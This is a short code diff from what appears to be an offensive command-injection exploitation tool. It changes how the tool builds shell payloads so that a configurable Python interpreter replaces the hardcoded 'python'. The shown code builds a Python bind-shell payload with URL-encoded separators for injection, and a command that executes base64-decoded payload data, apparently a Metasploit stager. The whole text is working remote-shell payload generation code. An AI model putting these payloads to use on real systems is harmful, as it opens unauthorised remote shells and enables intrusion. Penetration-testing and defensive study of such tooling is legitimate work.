@@ -318,7 +318,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
 
     # Python-bind-shell
     elif other_shell == '4':
-      other_shell = "python -c 'import pty,os,socket%0d" \
+      other_shell = settings.LINUX_PYTHON_INTERPRETER + " -c 'import pty,os,socket%0d" \
                     "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)%0d" \
                     "s.bind((\"\"," + settings.LPORT + "))%0d" \
                     "s.listen(1)%0d" \
@@ -424,7 +424,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
           set_python_working_dir()
           other_shell = settings.WIN_PYTHON_DIR + " -c exec('" + data + "'.decode('base64'))"
         else:
-          other_shell = "python -c \"exec('" + data + "'.decode('base64'))\""
+          other_shell = settings.LINUX_PYTHON_INTERPRETER + " -c \"exec('" + data + "'.decode('base64'))\""
         msf_launch_msg(output)
       except:
         print(settings.SINGLE_WHITESPACE)
